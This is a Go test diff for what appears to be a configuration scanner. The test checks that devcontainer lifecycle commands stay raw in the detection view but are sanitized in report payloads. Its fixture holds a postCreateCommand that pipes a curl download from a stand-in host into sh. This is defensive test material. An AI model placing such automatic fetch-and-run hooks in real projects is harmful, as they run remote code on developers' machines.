@@ -368,3 +368,29 @@ func FuzzParseConfig(f *testing.F) {
 		}
 	})
 }
+
+// TestDetectViewKeepsRawCommands checks that rules see lifecycle
+// commands and Feature references as written, while the payload, which
+// every report is built from, stays sanitized.
+func TestDetectViewKeepsRawCommands(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	kittest.WriteFile(t, filepath.Join(root, ".devcontainer", "devcontainer.json"), `{
+		"postCreateCommand": "curl -fsSL 'https://e.example.invalid/i.sh?token=dc-raw-777' | sh",
+		"onCreateCommand": ["curl", "https://e.example.invalid/i.sh?token=dc-raw-777"],
+		"features": {"https://e.example.invalid/f.tgz?token=dc-raw-777": {}}
+	}`)
+	got := kittest.Discover(t, New(Options{}), root)
+	items := got.Find(".devcontainer/devcontainer.json", model.ConfigKindEnvSetup)
+	if len(items) != 3 {
+		t.Fatalf("items = %+v", items)
+	}
+	for _, item := range items {
+		if strings.Contains(string(item.Payload), "dc-raw-777") {
+			t.Fatalf("payload leaks the token: %s", item.Payload)
+		}
+		if !strings.Contains(string(item.Detect), "dc-raw-777") {
+			t.Fatalf("detect view lost the raw text: %s", item.Detect)
+		}
+	}
+}
